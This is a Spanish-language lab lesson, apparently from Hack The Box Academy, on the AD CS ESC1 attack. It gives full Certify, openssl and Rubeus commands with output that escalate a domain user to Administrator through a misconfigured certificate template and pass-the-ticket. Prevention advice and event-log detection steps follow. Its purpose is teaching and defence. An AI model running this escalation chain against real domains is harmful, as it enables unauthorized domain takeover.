# PKI - ESC1

# **Descripción**

Después`SpectreOps`Lanzó el trabajo de investigación[Certificado de propiedad de propiedad](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) se convirtió en uno de los vectores de ataque más favoritos para los agentes de amenazas debido a muchas razones, que incluyen:

1. El uso de certificados para la autenticación tiene más ventajas que las credenciales de nombre de usuario/contraseña regulares.
2. La mayoría de los servidores PKI estaban mal configurados/vulnerables a al menos uno de los ocho ataques descubiertos por Spectreops (varios investigadores han descubierto más ataques desde entonces).

Hay una gran cantidad de ventajas para usar certificados y comprometer el`Certificate Authority` (`CA`):

- Los certificados de usuarios y máquinas son válidos por 1+ años.
- Restablecer una contraseña de usuario no invalida el certificado. Con los certificados, no importa cuántas veces un usuario cambie su contraseña; El certificado seguirá siendo válido (a menos que esté expirado o revocado).
- Las plantillas mal configuradas permiten obtener un certificado para cualquier usuario.
- Comprometer los resultados de la clave privada de la CA en la falsificación`Golden Certificates`.

Estas ventajas hacen de los certificados el método preferido para la persistencia a largo plazo. Mientras que Spectreops reveló ocho técnicas de escalada de privilegios, examinaremos el primero,`ESC1`, para demostrar cómo funciona. La descripción de`ESC1`es:

- `Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.

---

# **Ataque**

Para empezar, usaremos[Certificar](https://github.com/GhostPack/Certify)Para escanear el entorno de vulnerabilidades en la infraestructura PKI:

PKI - ESC1

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=eagle,DC=local'

[*] Listing info about the Enterprise CA 'eagle-PKI-CA'

    Enterprise CA Name            : eagle-PKI-CA
    DNS Hostname                  : PKI.eagle.local
    FullName                      : PKI.eagle.local\eagle-PKI-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=eagle-PKI-CA, DC=eagle, DC=local
    Cert Thumbprint               : 7C59C4910A1C853128FE12C17C2A54D93D1EECAA
    Cert Serial                   : 780E7B38C053CCAB469A33CFAAAB9ECE
    Cert Start Date               : 09/08/2022 14.07.25
    Cert End Date                 : 09/08/2522 14.17.25
    Cert Chain                    : CN=eagle-PKI-CA,DC=eagle,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
      Allow  ManageCA, ManageCertificates               EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : PKI.eagle.local\eagle-PKI-CA
    Template Name                         : UserCert
    Schema Version                        : 4
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
    Permissions
      Enrollment Permissions
        Enrollment Rights           : EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Domain Users            S-1-5-21-1518138621-4282902758-752445584-513
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
      Object Control Permissions
        Owner                       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
        WriteOwner Principals       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteDacl Principals        : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
        WriteProperty Principals    : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519

Certify completed in 00:00:00.9120044

```

![](https://academy.hackthebox.com/storage/modules/176/A13/certifyRequest.png)

Al verificar la sección 'Plantillas de certificados vulnerables' desde la salida de Certify, veremos que se enumera una sola plantilla con mucha información al respecto. Podemos decir que el nombre de la CA en el medio ambiente es`PKI.eagle.local\eagle-PKI-CA`, y la plantilla vulnerable se nombra`UserCert`. La plantilla es vulnerable porque:

- Todos los usuarios de dominio pueden solicitar un certificado en esta plantilla.
- La bandera[Ct_flag_enrollee_supplies_subject](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1)está presente, lo que permite al solicitante especificar el`SAN`(Por lo tanto, cualquier usuario puede solicitar un certificado como cualquier otro usuario en la red, incluidos los privilegiados).
- No se requiere la aprobación del gerente (el certificado se emite inmediatamente después de la solicitud sin aprobación).
- El certificado se puede utilizar para 'autenticación del cliente' (podemos usarlo para inicio de sesión/autenticación).

Para abusar de esta plantilla, usaremos`Certify`y pasar el argumento`request`Al especificar el nombre completo de la CA, el nombre de la plantilla vulnerable y el nombre del usuario, por ejemplo,`Administrator`:

PKI - ESC1

```powershell
PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : EAGLE\bob
[*] No subject name specified, using current context as subject.

[*] Template                : UserCert
[*] Subject                 : CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] AltName                 : Administrator

[*] Certificate Authority   : PKI.eagle.local\eagle-PKI-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 36

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIE...
<SNIP>
<SNIP>
wgP7EwPpxHKOrlZr6H+5lS58u/9EuIgdSk1X3VWuZvWRdjL15ovn
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAACx6zV6bbfN1ZQAAAAAALDANBgkqhkiG9w0BAQsF
<SNIP>
<SNIP>
eVAB
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:15.8803493

```

![](https://academy.hackthebox.com/storage/modules/176/A13/requestCert.png)

Una vez que termine el ataque, obtendremos un certificado con éxito. El comando genera un`PEM`certificado y lo muestra como base64. Necesitamos convertir el`PEM`certificado al[PFX](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files)Formato ejecutando el comando mencionado en la salida de certificación (cuando se le pide la contraseña, presione`Enter`Sin proporcionar uno), sin embargo, para estar en el lado seguro, ejecuemos primero el siguiente comando para evitar un mal formato del`PEM`archivo.

PKI - ESC1

```
xnoxos@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
```

Entonces podemos ejecutar el`openssl`Comando mencionado en la salida de Certify.

PKI - ESC1

```
xnoxos@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![](https://academy.hackthebox.com/storage/modules/176/A13/convertPEM.png)

Ahora que tenemos el certificado en un utilizable`PFX`formato (que`Rubeus`admite), podemos solicitar un Kerberos TGT para la cuenta`Administrator`y autenticar con el certificado:

PKI - ESC1

```powershell
PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=bob, OU=EagleUsers, DC=eagle, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/eagle.local
  ServiceRealm             :  EAGLE.LOCAL
  UserName                 :  Administrator
  UserRealm                :  EAGLE.LOCAL
  StartTime                :  19/12/2022 21.04.53
  EndTime                  :  20/12/2022 07.04.53
  RenewTill                :  26/12/2022 21.04.53
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  KQTCgNhj3sh4yXvrBwTfeg==
  ASREP (key)              :  2EB79553702442F11E93044E3C915490

```

![](https://academy.hackthebox.com/storage/modules/176/A13/certLogin.png)

Después de una autenticación exitosa, podremos enumerar el contenido del`C$`Compartir en DC1:

PKI - ESC1

```powershell
PS C:\Users\bob\Downloads> dir \\dc1\c$

    Directory: \\dc1\c$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/15/2022   6:30 PM                DFSReports
d-----        10/13/2022  11:23 PM                Mimikatz
d-----          9/1/2022   9:49 PM                PerfLogs
d-r---        11/28/2022  10:59 AM                Program Files
d-----          9/1/2022   2:02 PM                Program Files (x86)
d-----        12/13/2022  11:22 AM                scripts
d-r---          8/7/2022   9:31 PM                Users
d-----        11/28/2022  11:27 AM                Windows

```

![](https://academy.hackthebox.com/storage/modules/176/A13/dirDC1.png)

---

# **Prevención**

El ataque no sería posible si el`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`La bandera no está habilitada en la plantilla de certificado. Otro método para frustrar este ataque es requerir`CA certificate manager approval`antes de emitir certificados; Esto asegurará que no se emitan certificados en plantillas potencialmente peligrosas sin la aprobación manual (lo que es de esperar que se correlacione que la solicitud se originó de un usuario legítimo).

Debido a que hay muchas técnicas de escalada de privilegios diferentes, se recomienda escanear regularmente el entorno con`Certify`u otras herramientas similares para encontrar posibles problemas de PKI.

---

# **Detección**

Cuando la CA genera el certificado, se registrarán dos eventos, uno para la solicitud recibida y otro para el certificado emitido, si tiene éxito. Esos eventos tienen las identificaciones de`4886`y`4887`Como se muestra a continuación:

![](https://academy.hackthebox.com/storage/modules/176/A13/eventBob.png)

Desafortunadamente, solo podemos decir que Bob solicitó un certificado de WS001; No podemos saber si la solicitud especificó el SAN.

La CA contiene una lista de todos los certificados emitidos, por lo que si miramos allí, veremos la solicitud de ID de certificado 36 (la del escenario de ataque anterior):

![](https://academy.hackthebox.com/storage/modules/176/A13/detectCert1.png)

La descripción general de la herramienta GUI tampoco muestra el SAN, pero podemos decir que se emitió un certificado a través de la plantilla vulnerable. Si queremos encontrar la información de SAN, necesitaremos abrir el certificado en sí:

![](https://academy.hackthebox.com/storage/modules/176/A13/detectCert2.png)

También existe la posibilidad de ver eso programáticamente: el comando`certutil -view`arrojará todo en la CA con toda la información sobre cada certificado (esto puede ser masivo en un entorno grande):

![](https://academy.hackthebox.com/storage/modules/176/A13/certpieces.png)

Con algunas secuencias de comandos, podemos automatizar el análisis y el descubrimiento de plantillas vulnerables abusadas por agentes de amenazas.

Finalmente, si recuerda, en el ataque, utilizamos el certificado obtenido para la autenticación y obtuvimos un TGT; AD registrará esta solicitud con la ID del evento`4768`, que tendrá específicamente información sobre el intento de inicio de sesión con un certificado:

![](https://academy.hackthebox.com/storage/modules/176/A13/detect1.png)

Tenga en cuenta que los eventos`4886`y`4887`se generará en la máquina que emite el certificado en lugar del controlador de dominio. Si el acceso GUI no está disponible, podemos usar pssession para interactuar con la máquina PKI y el`Get-WinEvent`cmdlet para buscar los eventos:

PKI - ESC1

```
C:\Users\bob\Downloads>runas /user:eagle\htb-student powershell

Enter the password for eagle\htb-student:
Attempting to start powershell as user "eagle\htb-student" ...

```

PKI - ESC1

```powershell
PS C:\WINDOWS\system32> New-PSSession PKI

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  4 WinRM4          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\WINDOWS\system32> Enter-PSSession PKI

[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:05:50 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:24:02 PM          4886 Information      Certificate Services received a certificate request....
4/11/2023 1:15:01 PM          4886 Information      Certificate Services received a certificate request....

[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/13/2023 4:06:05 PM          4887 Information      Certificate Services approved a certificate request and...
4/13/2023 4:06:02 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
4/11/2023 1:15:12 PM          4887 Information      Certificate Services approved a certificate request and..

```

Para ver el registro de auditoría completo de los eventos, podemos llevar la salida a`Format-List`, o guarde los eventos en una matriz y verifíquelos individualmente:

PKI - ESC1

```powershell
[pki]: PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}[pki]: PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *Message              : Certificate Services received a certificate request.

                       Request ID:      51
                       Requester:       EAGLE\DC2$
                       Attributes:
                       CertificateTemplate:DomainController
                       ccm:PKI.eagle.local
Id                   : 4886
Version              : 0
Qualifiers           :
Level                : 0
Task                 : 12805
Opcode               : 0
Keywords             : -9214364837600034816
RecordId             : 21100
ProviderName         : Microsoft-Windows-Security-Auditing
ProviderId           : 54849625-5478-4994-a5ba-3e3b0328c30d
LogName              : Security
ProcessId            : 660
ThreadId             : 772
MachineName          : PKI.eagle.local
UserId               :
TimeCreated          : 4/11/2023 1:24:02 PM
ActivityId           : dcf643ef-6c67-0000-6e44-f6dc676cd901
RelatedActivityId    :
ContainerLog         : Security
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Certification Services
KeywordsDisplayNames : {Audit Success}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}

```

---

¡Espere durante 7-10 minutos después de generar el objetivo de las preguntas a continuación antes de solicitar/generar cualquier certificado de anuncios!

Para un rendimiento mejorado de RDP, se recomienda primero SSH al host Kali mientras habilita[Reenvío de puertos dinámico](https://academy.hackthebox.com/module/158/section/1426), seguido de una conexión RDP a WS001 de su host de ataque utilizando proxychains.